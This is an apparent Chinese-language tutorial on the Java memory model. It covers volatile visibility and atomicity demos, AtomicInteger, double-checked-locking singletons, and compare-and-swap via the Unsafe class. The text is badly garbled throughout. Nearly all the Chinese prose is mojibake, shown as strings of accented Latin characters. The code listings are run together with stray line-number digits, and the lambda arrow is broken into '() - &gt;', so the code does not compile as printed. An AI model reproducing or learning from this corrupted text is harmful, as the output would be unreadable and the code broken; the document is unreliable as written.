å†…å­˜æ¨¡å‹ä¸­è§„å®šæ‰€æœ‰å˜é‡éƒ½å­˜å‚¨åˆ°ä¸»å†…å­˜ï¼Œä¸»å†…å­˜æ˜¯å…±äº«å†…å­˜åŒºåŸŸï¼Œæ‰€æœ‰çº¿ç¨‹éƒ½å¯ä»¥è®¿é—®ï¼Œä½†çº¿ç¨‹å¯¹å˜é‡çš„æ“ä½œï¼ˆè¯»å–ã€å¤åˆ¶ç­‰ï¼‰å¿…é¡»åœ¨å·¥ä½œå†…å­˜ä¸­è¿›è¡Œã€‚é¦–å…ˆè¦å°†å˜é‡ä»ä¸»å†…å­˜æ‹·è´åˆ°è‡ªå·±çš„å·¥ä½œå†…å­˜ç©ºé—´ï¼Œç„¶åå¯¹å˜é‡è¿›è¡Œæ“ä½œï¼Œæ“ä½œå®Œæˆåå†å°†å˜é‡å†™å›ä¸»å†…å­˜ï¼Œä¸èƒ½ç›´æ¥æ“ä½œä¸»å†…å­˜ä¸­çš„å˜é‡ï¼Œå„ä¸ªçº¿ç¨‹ä¸­çš„å·¥ä½œå†…å­˜ä¸­å­˜å‚¨ç€ä¸»å†…å­˜ä¸­çš„å˜é‡å‰¯æœ¬æ‹·è´ï¼Œå› æ­¤ä¸åŒçš„çº¿ç¨‹é—´æ— æ³•è®¿é—®å¯¹æ–¹çš„å·¥ä½œå†…å­˜ï¼Œçº¿ç¨‹é—´çš„é€šä¿¡ï¼ˆä¼ å€¼ï¼‰å¿…é¡»é€šè¿‡ä¸»å†…å­˜æ¥å®Œæˆï¼Œå…¶ç®€è¦è®¿é—®è¿‡ç¨‹å¦‚ä¸‹å›¾ï¼š Java å†…å­˜æ¨¡å‹çš„ç‰¹æ€§Java å†…å­˜æ¨¡å‹å›´ç»•ç€å¹¶å‘è¿‡ç¨‹ä¸­å¦‚ä½•å¤„ç†åŸå­æ€§ã€å¯è§æ€§å’Œæœ‰åºæ€§è¿™ä¸‰ä¸ªç‰¹å¾æ¥è®¾è®¡çš„ã€‚ åŸå­æ€§ï¼ˆAtomicityï¼‰ï¼š ç”± Java å†…å­˜æ¨¡å‹æ¥ç›´æ¥ä¿è¯åŸå­æ€§çš„å˜é‡æ“ä½œåŒ…æ‹¬ readã€loadã€useã€assignã€storeã€write è¿™å…­ç§æ“ä½œï¼Œè™½ç„¶å­˜åœ¨ long å’Œ double çš„ç‰¹ä¾‹ï¼Œä½†åŸºæœ¬å¯ä»¥å¿½ç•¥ä¸è®¡ï¼Œç›®å‰è™šæ‹ŸæœºåŸºæœ¬éƒ½å¯¹å…¶å®ç°äº†åŸå­æ€§ã€‚å¦‚æœéœ€è¦æ›´å¤§èŒƒå›´çš„æ§åˆ¶ï¼Œlock å’Œ unlock ä¹Ÿå¯ä»¥æ»¡è¶³éœ€æ±‚ã€‚lock å’Œ unlock è™½ç„¶æ²¡æœ‰è¢«è™šæ‹Ÿæœºç›´æ¥æä¾›ç»™ç”¨æˆ·ä½¿ç”¨ï¼Œä½†æ˜¯æä¾›äº†å­—èŠ‚ç å±‚æ¬¡çš„æŒ‡ä»¤ monitorenter å’Œ monitorexit å¯¹åº”è¿™ä¸¤ä¸ªæ“ä½œï¼Œå¯¹åº”åˆ° Java ä»£ç å°±æ˜¯ synchronized å…³é”®å­—ï¼Œå› æ­¤åœ¨ synchronized å—ä¹‹é—´çš„ä»£ç éƒ½å…·æœ‰åŸå­æ€§ã€‚ å¯è§æ€§ï¼ˆVisibilityï¼‰ï¼š å¯è§æ€§æ˜¯æŒ‡ä¸€ä¸ªçº¿ç¨‹ä¿®æ”¹äº†ä¸€ä¸ªå˜é‡çš„å€¼åï¼Œå…¶ä»–çº¿ç¨‹ç«‹å³å¯ä»¥æ„ŸçŸ¥åˆ°è¿™ä¸ªå€¼çš„ä¿®æ”¹ã€‚æ­£å¦‚å‰é¢æ‰€è¯´ï¼Œvolatile ç±»å‹çš„å˜é‡åœ¨ä¿®æ”¹åä¼šç«‹å³åŒæ­¥ç»™ä¸»å†…å­˜ï¼Œåœ¨ä½¿ç”¨çš„æ—¶å€™ä¼šä»ä¸»å†…å­˜é‡æ–°è¯»å–ï¼Œæ˜¯ä¾èµ–ä¸»å†…å­˜ä¸ºä¸­ä»‹æ¥ä¿è¯å¤šçº¿ç¨‹ä¸‹å˜é‡å¯¹å…¶ä»–çº¿ç¨‹çš„å¯è§æ€§çš„ã€‚é™¤äº† volatile ä¹‹å¤–ï¼Œsynchronized å’Œ final ä¹Ÿå¯ä»¥å®ç°å¯è§æ€§ã€‚synchronized å…³é”®å­—æ˜¯é€šè¿‡ unlock ä¹‹å‰å¿…é¡»æŠŠå˜é‡åŒæ­¥å›ä¸»å†…å­˜æ¥å®ç°çš„ï¼Œfinal åˆ™æ˜¯åœ¨åˆå§‹åŒ–åå°±ä¸ä¼šæ›´æ”¹ï¼Œæ‰€ä»¥åªè¦åœ¨åˆå§‹åŒ–è¿‡ç¨‹ä¸­æ²¡æœ‰æŠŠ this æŒ‡é’ˆä¼ é€’å‡ºå»ä¹Ÿèƒ½ä¿è¯å¯¹å…¶ä»–çº¿ç¨‹çš„å¯è§æ€§ã€‚ æœ‰åºæ€§ï¼š æœ‰åºæ€§ä»ä¸åŒçš„è§’åº¦æ¥çœ‹æ˜¯ä¸åŒçš„ã€‚å•çº¯å•çº¿ç¨‹æ¥çœ‹éƒ½æ˜¯æœ‰åºçš„ï¼Œä½†åˆ°äº†å¤šçº¿ç¨‹å°±ä¼šè·Ÿæˆ‘ä»¬é¢„æƒ³çš„ä¸ä¸€æ ·ã€‚å¯ä»¥è¿™ä¹ˆè¯´ï¼šå¦‚æœåœ¨æœ¬çº¿ç¨‹å†…éƒ¨è§‚å¯Ÿï¼Œæ‰€æœ‰æ“ä½œéƒ½æ˜¯æœ‰åºçš„ï¼›å¦‚æœåœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­è§‚å¯Ÿå¦ä¸€ä¸ªçº¿ç¨‹ï¼Œæ‰€æœ‰çš„æ“ä½œéƒ½æ˜¯æ— åºçš„ã€‚å‰åŠå¥è¯´çš„å°±æ˜¯çº¿ç¨‹å†…è¡¨ç°ä¸ºä¸²è¡Œçš„è¯­ä¹‰ï¼ŒååŠå¥æŒ‡çš„æ˜¯æŒ‡ä»¤é‡æ’ç°è±¡å’Œä¸»å†…å­˜ä¸å·¥ä½œå†…å­˜ä¹‹é—´åŒæ­¥å­˜åœ¨å»¶è¿Ÿçš„ç°è±¡ã€‚ä¿è¯æœ‰åºæ€§çš„å…³é”®å­—æœ‰ volatile å’Œ synchronizedï¼Œå…¶ä¸­ volatile ç¦æ­¢äº†æŒ‡ä»¤é‡æ’åºï¼Œè€Œ synchronized åˆ™ç”±ä¸€ä¸ªå˜é‡åœ¨åŒä¸€æ—¶åˆ»åªèƒ½è¢«ä¸€ä¸ªçº¿ç¨‹å¯¹å…¶è¿›è¡Œ lock æ“ä½œæ¥ä¿è¯ã€‚ æ€»ç»“ï¼šsynchronized å¯¹ä¸‰ç§ç‰¹æ€§éƒ½æœ‰æ”¯æŒï¼Œè™½ç„¶ç®€å•ï¼Œä½†æ˜¯å¦‚æœæ— æ§åˆ¶åœ°æ»¥ç”¨å¯¹æ€§èƒ½å°±ä¼šäº§ç”Ÿè¾ƒå¤§å½±å“ã€‚ Java å†…å­˜æ¨¡å‹çš„å¯è§æ€§é—®é¢˜å„ä¸ªçº¿ç¨‹å¯¹ä¸»å†…å­˜ä¸­å…±äº«å˜é‡çš„æ“ä½œï¼Œå…¶æœ¬è´¨éƒ½æ˜¯å„ä¸ªçº¿ç¨‹å„è‡ªæ‹·è´å…±äº«å˜é‡åˆ°è‡ªå·±çš„å·¥ä½œå†…å­˜ä¸­è¿›è¡Œæ“ä½œåå†å†™å›ä¸»å†…å­˜ä¸­çš„ã€‚è¿™å°±å¯èƒ½å­˜åœ¨ä¸€ä¸ªçº¿ç¨‹ A ä¿®æ”¹äº†å…±äº«å˜é‡ X çš„å€¼ä½†è¿˜æœªå†™å›ä¸»å†…å­˜æ—¶ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹ B åˆå¯¹ä¸»å†…å­˜ä¸­åŒä¸€ä¸ªå…±äº«å˜é‡ X è¿›è¡Œæ“ä½œï¼Œä½†æ­¤æ—¶ A çº¿ç¨‹å·¥ä½œå†…å­˜ä¸­çš„å…±äº«å˜é‡ X å¯¹çº¿ç¨‹ B æ¥è¯´å¹¶ä¸æ˜¯å¯è§çš„ï¼Œè¿™ç§å·¥ä½œå†…å­˜ä¸ä¸»å†…å­˜åŒæ­¥å­˜åœ¨å»¶è¿Ÿç°è±¡å°±ä¼šé€ æˆå¯è§æ€§é—®é¢˜ã€‚æ­¤æ—¶å¯ä»¥ä½¿ç”¨ synchronized æˆ– volatile å…³é”®å­—è§£å†³è¯¥é—®é¢˜ï¼Œä¸¤è€…éƒ½å¯ä»¥ä½¿ä¸€ä¸ªçº¿ç¨‹ä¿®æ”¹åçš„å˜é‡ç«‹å³å¯¹å…¶ä»–çº¿ç¨‹å¯è§ã€‚ Volatile çš„éªŒè¯ä»£ç Volatile ä¿è¯å¯è§æ€§çš„éªŒè¯ä»£ç  â˜…å±•å¼€ä»£ç â˜… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * 1 éªŒè¯volatileçš„å¯è§æ€§ * 1.1 åŠ å…¥int number=0ï¼Œnumberå˜é‡ä¹‹å‰æ²¡æœ‰æ·»åŠ volatileå…³é”®å­—ä¿®é¥°ï¼Œæ²¡æœ‰å¯è§æ€§ * 1.2 æ·»åŠ äº†volatileå…³é”®å­—ï¼Œå¯ä»¥è§£å†³å¯è§æ€§é—®é¢˜ */ public class VolatileDemo { public static void main(String[] args) { MyData data = new MyData(); new Thread(() - &gt; { System.out.println(Thread.currentThread().getName() + " thread come in"); try { TimeUnit.SECONDS.sleep(3); } catch(InterruptedException e) { e.printStackTrace(); } data.setNumber(); System.out.println(Thread.currentThread().getName() + " thread set number is " + data.number); }, "AAA").start(); while(data.number == 0) { // mainçº¿ç¨‹ä¸€ç›´åœ¨è¿™é‡Œå¾ªç¯ç­‰å¾…ï¼Œç›´åˆ°numberçš„å€¼ä¸å†ç­‰äºé›¶ } System.out.println(Thread.currentThread().getName() + " thread is over, the number is " + data.number); } } class MyData { // int number = 0; // volatileå¯ä»¥ä¿è¯å¯è§æ€§ï¼Œå³å¯ä»¥åŠæ—¶é€šçŸ¥å…¶ä»–çº¿ç¨‹ï¼Œä¸»å†…å­˜ä¸­çš„å˜é‡å€¼å·²ç»è¢«ä¿®æ”¹ volatile int number = 0; public void setNumber() { this.number = 60; } } 123AAA thread come inAAA thread set number is 60main thread is over, the number is 60 Volatile ä¸ä¿è¯åŸå­æ€§çš„éªŒè¯ä»£ç Volatile ä¸ä¿è¯åŸå­æ€§ï¼Œè¿™é‡Œçš„åŸå­æ€§æ˜¯æŒ‡ä¸å¯åˆ†å‰²ï¼Œå®Œæ•´æ€§ï¼Œå³æŸä¸ªçº¿ç¨‹æ­£åœ¨åšæŸä¸ªå…·ä½“ä¸šåŠ¡æ—¶ï¼Œä¸­é—´ä¸å¯ä»¥è¢«åŠ å¡æˆ–è€…è¢«åˆ†å‰²ï¼›éœ€è¦æ•´ä½“å®Œæ•´ï¼Œè¦ä¹ˆåŒæ—¶æˆåŠŸï¼Œè¦ä¹ˆåŒæ—¶å¤±è´¥ã€‚åŸºäº Volatile å˜é‡çš„è¿ç®—åœ¨å¹¶å‘ä¸‹ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚Volatile çš„è§„åˆ™ä¿è¯äº† readã€loadã€use çš„é¡ºåºå’Œè¿ç»­æ€§ï¼ŒåŒç† assignã€storeã€write ä¹Ÿæ˜¯é¡ºåºå’Œè¿ç»­çš„ã€‚ä¹Ÿå°±æ˜¯è¿™å‡ ä¸ªåŠ¨ä½œæ˜¯åŸå­æ€§çš„ï¼Œä½†æ˜¯å¯¹å˜é‡çš„ä¿®æ”¹ï¼Œæˆ–è€…å¯¹å˜é‡çš„è¿ç®—ï¼Œå´ä¸èƒ½ä¿è¯æ˜¯åŸå­æ€§çš„ã€‚å¦‚æœå¯¹å˜é‡çš„ä¿®æ”¹æ˜¯åˆ†ä¸ºå¤šä¸ªæ­¥éª¤çš„ï¼Œé‚£ä¹ˆå¤šä¸ªçº¿ç¨‹åŒæ—¶ä»ä¸»å†…å­˜æ‹¿åˆ°çš„å€¼æ˜¯æœ€æ–°çš„ï¼Œä½†æ˜¯ç»è¿‡å¤šæ­¥è¿ç®—åå›å†™åˆ°ä¸»å†…å­˜çš„å€¼æ˜¯æœ‰å¯èƒ½å­˜åœ¨è¦†ç›–æƒ…å†µå‘ç”Ÿçš„ã€‚ â˜…å±•å¼€ä»£ç â˜… 1234567891011121314151617181920212223242526272829303132333435363738/** * 1. éªŒè¯volatileä¸ä¿è¯åŸå­æ€§ */ public class VolatileDemo2 { public static void main(String[] args) { MyData2 data = new MyData2(); for(int i = 0; i &lt; 20; i++) { new Thread(() - &gt; { for(int j = 0; j &lt; 1000; j++) { data.add(); } }).start(); } while(Thread.activeCount() &gt; 1) { Thread.yield(); } System.out.println("the number is " + data.number); } } class MyData2 { volatile int number = 0; public void add() { this.number++; } } 1the number is 15386 ä¸Šè¿°ä»£ç å°±æ˜¯å¯¹ volatile ç±»å‹çš„å˜é‡å¯åŠ¨äº† 20 ä¸ªçº¿ç¨‹ï¼Œæ¯ä¸ªçº¿ç¨‹å¯¹å˜é‡æ‰§è¡Œ 1000 æ¬¡åŠ  1 æ“ä½œï¼Œå¦‚æœ volatile å˜é‡å¹¶å‘æ“ä½œæ²¡æœ‰é—®é¢˜çš„è¯ï¼Œé‚£ä¹ˆç»“æœåº”è¯¥æ˜¯è¾“å‡º 20000ï¼Œä½†æ˜¯è¿è¡Œç»“æœæ¯æ¬¡å¤§æ¦‚ç‡éƒ½æ˜¯å°äº 20000ï¼Œè¿™å°±æ˜¯å› ä¸º number++ æ“ä½œä¸æ˜¯åŸå­æ€§çš„ï¼ˆå›¾è§£ï¼‰ï¼Œæ˜¯åˆ†å¤šä¸ªæ­¥éª¤å®Œæˆçš„ã€‚å‡è®¾ä¸¤ä¸ªçº¿ç¨‹ aã€b åŒæ—¶å–åˆ°äº†ä¸»å†…å­˜çš„å€¼æ˜¯ 0ï¼Œè¿™æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œåœ¨è¿›è¡Œ ++ æ“ä½œçš„æ—¶å€™å‡è®¾çº¿ç¨‹ a æ‰§è¡Œåˆ°ä¸€åŠï¼Œçº¿ç¨‹ b æ‰§è¡Œå®Œäº†ï¼Œè¿™æ—¶çº¿ç¨‹ b ç«‹å³åŒæ­¥ç»™äº†ä¸»å†…å­˜ï¼Œä¸»å†…å­˜çš„å€¼ä¸º 1ï¼Œè€Œçº¿ç¨‹ a æ­¤æ—¶ä¹Ÿæ‰§è¡Œå®Œäº†ï¼ŒåŒæ­¥ç»™äº†ä¸»å†…å­˜ï¼Œæ­¤æ—¶çš„å€¼ä»ç„¶æ˜¯ 1ï¼Œçº¿ç¨‹ b çš„ç»“æœè¢«è¦†ç›–æ‰äº†ã€‚ è§£å†³ Volatile ä¸ä¿è¯åŸå­æ€§çš„é—®é¢˜ç”±äº Volatile ä¸ä¿è¯åŸå­æ€§ï¼Œå¯¼è‡´åŸºäº Volatile å˜é‡çš„è¿ç®—åœ¨å¹¶å‘ä¸‹ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨ AtomicInteger è¿™æ ·çš„åŸå­åŒ…è£…ç±»æ¥è§£å†³ã€‚ â˜…å±•å¼€ä»£ç â˜… 123456789101112131415161718192021222324252627282930313233343536373839/** * 1. ä½¿ç”¨AtomicIntegerè§£å†³Volatileä¸ä¿è¯åŸå­æ€§çš„é—®é¢˜ */ public class VolatileDemo3 { public static void main(String[] args) { MyData3 data = new MyData3(); for(int i = 0; i &lt; 20; i++) { new Thread(() - &gt; { for(int j = 0; j &lt; 1000; j++) { data.add(); } }).start(); } while(Thread.activeCount() &gt; 1) { Thread.yield(); } System.out.println("the number is " + data.number.get()); } } class MyData3 { // AtomicIntegerç±»é‡Œçš„å˜é‡åŒ…å«äº†volatileå…³é”®å­— AtomicInteger number = new AtomicInteger(); public void add() { this.number.getAndIncrement(); } } å•ä¾‹æ¨¡å¼ä¸­ Volatile çš„ä½¿ç”¨åˆ†æ â˜…å±•å¼€ä»£ç â˜… 1234567891011121314151617181920212223242526272829303132333435363738394041/** * å•ä¾‹æ¨¡å¼ * 1) DCLï¼ˆåŒç«¯æ£€é”ï¼‰æœºåˆ¶ä¸ä¸€å®šæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼ŒåŸå› æ˜¯æœ‰æŒ‡ä»¤é‡æ’åºçš„å­˜åœ¨ * 2) åŸå› åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼ŒæŸä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œåˆ°ç¬¬ä¸€ä¸ªæ£€æµ‹ï¼Œè¯»å–åˆ°çš„instanceä¸ä¸ºnullæ—¶ï¼Œinstanceçš„å¼•ç”¨å¯¹è±¡å¯èƒ½æ²¡æœ‰å®Œæˆåˆå§‹åŒ– * 3) æŒ‡ä»¤é‡æ’åªä¼šä¿è¯ä¸²è¡Œè¯­ä¹‰çš„æ‰§è¡Œä¸€è‡´æ€§ï¼ˆå•çº¿ç¨‹ï¼‰ï¼Œä½†å¹¶ä¸ä¼šå…³å¿ƒå¤šçº¿ç¨‹é—´çš„è¯­ä¹‰ä¸€è‡´æ€§ã€‚æ‰€ä»¥å½“ä¸€æ¡çº¿ç¨‹è®¿é—®instanceä¸ä¸ºnullæ—¶ï¼Œç”±äºinstanceå®ä¾‹æœªå¿…å·²åˆå§‹åŒ–å®Œæˆï¼Œä¹Ÿå°±é€ æˆäº†çº¿ç¨‹å®‰å…¨é—®é¢˜ */public class VolatileDemo4{ private static VolatileDemo4 demo; private VolatileDemo4() { System.out.println("inited ..."); } public static VolatileDemo4 getInstance() { if(demo == null) { synchronized(VolatileDemo4.class) { if(demo == null) { demo = new VolatileDemo4(); } } } return demo; } public static void main(String[] args) { for(int i = 0; i &lt; 10; i++) { new Thread(() - &gt; { VolatileDemo4.getInstance(); }).start(); } }} å…¶ä¸­ä»£ç  demo = new VolatileDemo4(); å¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸‰æ­¥å®Œæˆï¼ˆä¼ªä»£ç ï¼‰ï¼š 123memory = allocate(); //1.åˆ†é…å¯¹è±¡å†…å­˜ç©ºé—´init(memory); //2.åˆå§‹åŒ–å¯¹è±¡instance = memory; //3.è®¾ç½® instance æŒ‡å‘åˆšåˆ†é…çš„å†…å­˜åœ°å€ï¼Œæ­¤æ—¶ instance != null æ­¥éª¤äºŒå’Œæ­¥éª¤ä¸‰ä¸å­˜åœ¨æ•°æ®ä¾èµ–å…³ç³»ï¼Œè€Œä¸”æ— è®ºé‡æ’å‰è¿˜æ˜¯é‡æ’åç¨‹åºçš„æ‰§è¡Œç»“æœåœ¨å•çº¿ç¨‹ä¸­å¹¶æ²¡æœ‰æ”¹å˜ï¼Œå› æ­¤è¿™ç§é‡æ’ä¼˜åŒ–æ˜¯å…è®¸çš„ã€‚æŒ‡ä»¤é‡æ’åçš„ä¼ªä»£ç å¦‚ä¸‹ï¼š 123memory = allocate(); //1.åˆ†é…å¯¹è±¡å†…å­˜ç©ºé—´instance = memory; //3.è®¾ç½® instance æŒ‡å‘åˆšåˆ†é…çš„å†…å­˜åœ°å€ï¼Œæ­¤æ—¶ instance != nullï¼Œä½†æ˜¯å¯¹è±¡è¿˜æ²¡æœ‰å®Œæˆåˆå§‹åŒ–init(memory); //2.åˆå§‹åŒ–å¯¹è±¡ æŒ‡ä»¤é‡æ’åªä¼šä¿è¯ä¸²è¡Œè¯­ä¹‰çš„æ‰§è¡Œä¸€è‡´æ€§ï¼ˆå•çº¿ç¨‹ï¼‰ï¼Œä½†å¹¶ä¸ä¼šå…³å¿ƒå¤šçº¿ç¨‹é—´çš„è¯­ä¹‰ä¸€è‡´æ€§ã€‚æ‰€ä»¥å½“ä¸€ä¸ªçº¿ç¨‹è®¿é—® instance ä¸ä¸º null æ—¶ï¼Œç”±äº instance å®ä¾‹æœªå¿…å·²åˆå§‹åŒ–å®Œæˆï¼Œä¹Ÿå°±é€ æˆäº†çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚ä¸ºäº†ä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œå¯ä»¥åŠ å…¥ volatile å…³é”®å­—æ¥ç¦æ­¢æŒ‡ä»¤é‡æ’ï¼Œå®Œæ•´çš„ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š â˜…å±•å¼€ä»£ç â˜… 123456789101112131415161718192021222324252627282930313233343536373839/*** å•ä¾‹æ¨¡å¼ä¸­ä½¿ç”¨Volatile* 1) DCLï¼ˆåŒç«¯æ£€é”ï¼‰æœºåˆ¶ä¸ä¸€å®šæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼ŒåŸå› æ˜¯æœ‰æŒ‡ä»¤é‡æ’åºçš„å­˜åœ¨ï¼ŒåŠ å…¥volatileå¯ä»¥ç¦æ­¢æŒ‡ä»¤é‡æ’ */public class VolatileDemo4{ private static volatile VolatileDemo4 demo; private VolatileDemo4() { System.out.println("inited ..."); } public static VolatileDemo4 getInstance() { if(demo == null) { synchronized(VolatileDemo4.class) { if(demo == null) { demo = new VolatileDemo4(); } } } return demo; } public static void main(String[] args) { for(int i = 0; i &lt; 10; i++) { new Thread(() - &gt; { VolatileDemo4.getInstance(); }).start(); } }} CASé¢è¯•å†…å®¹ä¸€èˆ¬ç”±æµ…å…¥æ·±ï¼Œæ¶‰åŠçš„å†…å®¹ä¸ºï¼š åŸå­ç±» â€“&gt; CAS â€“&gt; UnSafe â€“&gt; CAS åº•å±‚æ€æƒ³ â€“&gt; ABA é—®é¢˜ â€“&gt; åŸå­æ›´æ–°å¼•ç”¨ â€“&gt; å¦‚ä½•è§£å†³ ABA é—®é¢˜ CAS æ˜¯ä»€ä¹ˆCASï¼ˆConmpare And Swapï¼Œæ¯”è¾ƒå’Œäº¤æ¢ï¼‰æ˜¯ä¸€æ¡ CPU å¹¶å‘åŸè¯­ã€‚å®ƒçš„åŠŸèƒ½æ˜¯åˆ¤æ–­å†…å­˜æŸä¸ªä½ç½®çš„å€¼æ˜¯å¦ä¸ºé¢„æœŸå€¼ï¼Œå¦‚æœæ˜¯åˆ™æ›´æ”¹ä¸ºæ–°çš„å€¼ï¼Œå¦åˆ™ç»§ç»­æ¯”è¾ƒåˆ°ä¸¤è€…ç›¸åŒä¸ºæ­¢ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯åŸå­çš„ã€‚CAS å¹¶å‘åŸè¯­ä½“ç°åœ¨ Java è¯­è¨€ä¸­å°±æ˜¯ sun.misc.Unsafe ç±»ä¸­çš„å„ä¸ªæ–¹æ³•ã€‚è°ƒç”¨ UnSafe ç±»ä¸­çš„ CAS æ–¹æ³•ï¼ŒJVM ä¼šå¸®æˆ‘ä»¬å®ç° CAS æ±‡ç¼–æŒ‡ä»¤ã€‚è¿™æ˜¯ä¸€ç§å®Œå…¨ä¾èµ–äºç¡¬ä»¶çš„åŠŸèƒ½ï¼Œé€šè¿‡å®ƒå¯ä»¥å®ç°åŸå­æ“ä½œã€‚ç”±äº CAS æ˜¯ä¸€ç§ç³»ç»ŸåŸè¯­ï¼ŒåŸè¯­å±äºæ“ä½œç³»ç»Ÿç”¨è¯­èŒƒç•´ï¼Œæ˜¯ç”±è‹¥å¹²æŒ‡ä»¤ç»„æˆçš„ï¼Œç”¨äºå®ŒæˆæŸä¸ªåŠŸèƒ½çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œå¹¶ä¸”åŸè¯­çš„æ‰§è¡Œå¿…é¡»æ˜¯è¿ç»­çš„ï¼Œåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¸å…è®¸è¢«ä¸­æ–­ï¼›ä¹Ÿå°±æ˜¯è¯´ CAS æ˜¯ä¸€æ¡ CPU çš„åŸå­æŒ‡ä»¤ï¼Œä¸ä¼šé€ æˆæ‰€è°“çš„æ•°æ®ä¸ä¸€è‡´æ€§é—®é¢˜ã€‚java.util.concurrent åŒ…ä¸­å€ŸåŠ© CAS å®ç°äº†åŒºåˆ«äº synchronouse åŒæ­¥é”çš„ä¸€ç§ä¹è§‚é”ã€‚ CAS åº•å±‚åŸç†è°ˆè°ˆå¯¹ Unsafe çš„ç†è§£ Unsafe æ˜¯ CAS çš„æ ¸å¿ƒå®ç°ç±»ï¼Œç”±äº Java æ–¹æ³•æ— æ³•ç›´æ¥è®¿é—®åº•å±‚ç³»ç»Ÿï¼Œéœ€è¦é€šè¿‡æœ¬åœ°ï¼ˆnativeï¼‰æ–¹æ³•æ¥è®¿é—®ï¼ŒUnsafe ç›¸å½“äºä¸€ä¸ªåé—¨ï¼ŒåŸºäºè¯¥ç±»å¯ä»¥ç›´æ¥æ“ä½œç‰¹å®šå†…å­˜çš„æ•°æ®ã€‚Unsafe ç±»å­˜åœ¨äº sun.misc åŒ…ä¸­ï¼Œå…¶å†…éƒ¨æ–¹æ³•æ“ä½œå¯ä»¥åƒ C/C++ çš„æŒ‡é’ˆä¸€æ ·ç›´æ¥æ“ä½œå†…å­˜ï¼Œå³ Java ä¸­ CAS æ“ä½œçš„æ‰§è¡Œä¾èµ–äº Unsafe ç±»çš„æ–¹æ³•ã€‚ç‰¹åˆ«æ³¨æ„ï¼šåœ¨ JDK 8 ä¸­ï¼ŒUnsafe ç±»ä¸­çš„å¤§å¤šæ•°æ–¹æ³•éƒ½æ˜¯ native ä¿®é¥°çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ Unsafe ç±»ä¸­çš„æ–¹æ³•éƒ½ç›´æ¥è°ƒç”¨æ“ä½œç³»ç»Ÿåº•å±‚èµ„æºæ¥æ‰§è¡Œç›¸åº”ä»»åŠ¡ã€‚åœ¨ AtomicInteger çš„æºç é‡Œï¼ˆå¦‚ä¸‹ç¬¬ä¸€å¼ å›¾ï¼‰ï¼Œå˜é‡ valueOffset è¡¨ç¤ºè¯¥å˜é‡åœ¨å†…å­˜ä¸­çš„åç§»åœ°å€ï¼Œå› ä¸º Unsafe å°±æ˜¯æ ¹æ®å†…å­˜åç§»åœ°å€è·å–æ•°æ®çš„ã€‚å˜é‡ value ç”¨ volatile ä¿®é¥°ï¼Œä¿è¯äº†å¤šçº¿ç¨‹ä¹‹é—´çš„å†…å­˜å¯è§æ€§ã€‚ AtomicInteger ç±»çš„æºç  AtomicInteger ç±»ä¸ Unsafe ç±»çš„æºç è°ƒç”¨åˆ†æ å‡è®¾çº¿ç¨‹ A å’Œçº¿ç¨‹ B ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶æ‰§è¡Œ getAndAddInt() æ–¹æ³•ï¼ˆåˆ†åˆ«åœ¨ä¸åŒçš„ CPU ä¸Šï¼‰: 1ï¼‰AtomicInteger é‡Œé¢çš„ value åŸå§‹å€¼ä¸º 3ï¼Œå³ä¸»å†…å­˜ä¸­ AtomicInteger çš„ value ä¸º 3ï¼Œæ ¹æ® JMM æ¨¡å‹ï¼Œçº¿ç¨‹ A å’Œçº¿ç¨‹ B å„è‡ªæ‹·è´ä¸€ä»½å€¼ä¸º 3 çš„ value çš„å‰¯æœ¬åˆ°å„è‡ªçš„å·¥ä½œå†…å­˜ä¸­ 2ï¼‰çº¿ç¨‹ A é€šè¿‡ getIntVolatile(var1,var2) æ‹¿åˆ° value å€¼ä¸º 3ï¼Œè¿™æ—¶å€™çº¿ç¨‹ A çªç„¶è¢«æŒ‚èµ· 3ï¼‰çº¿ç¨‹ B ä¹Ÿé€šè¿‡ getIntVolatile(var1,var2) æ‹¿åˆ° value å€¼ä¸º 3ï¼Œæ­¤æ—¶åˆšå¥½çº¿ç¨‹ B æ²¡æœ‰è¢«æŒ‚èµ·ï¼Œå¹¶æ‰§è¡Œ compareAndSwapInt() æ–¹æ³•æ¯”è¾ƒä¸»å†…å­˜ä¸­çš„å€¼ä¹Ÿæ˜¯ 3ï¼ŒæˆåŠŸä¿®æ”¹ä¸»å†…å­˜ä¸­çš„å€¼ä¸º 4ï¼Œçº¿ç¨‹ B è‡³æ­¤å®Œæˆä»»åŠ¡æ“ä½œ 4ï¼‰è¿™æ—¶å€™çº¿ç¨‹ A æ¢å¤ï¼Œæ‰§è¡Œ compareAndSwapInt() æ–¹æ³•æ¯”è¾ƒï¼Œå‘ç°è‡ªå·±æ‰‹é‡Œçš„æ•°å€¼å’Œä¸»å†…å­˜ä¸­çš„æ•°å­— 4 ä¸ä¸€è‡´ï¼Œè¯´æ˜è¯¥å€¼å·²ç»è¢«å…¶ä»–çº¿ç¨‹æŠ¢å…ˆä¸€æ­¥ä¿®æ”¹äº†ï¼Œé‚£ A çº¿ç¨‹ä¿®æ”¹å¤±è´¥ï¼Œåªèƒ½é‡æ–°æ“ä½œä¸€é 5ï¼‰çº¿ç¨‹ A é‡æ–°è·å– value çš„å€¼ï¼Œå› ä¸ºå˜é‡ value æ˜¯ volatile ä¿®é¥°ï¼Œæ‰€ä»¥å…¶ä»–çº¿ç¨‹å¯¹å®ƒçš„ä¿®æ”¹ï¼Œçº¿ç¨‹ A æ€»æ˜¯èƒ½å¤Ÿæ„ŸçŸ¥åˆ°ï¼Œçº¿ç¨‹ A ç»§ç»­æ‰§è¡Œ compareAndSwapInt() 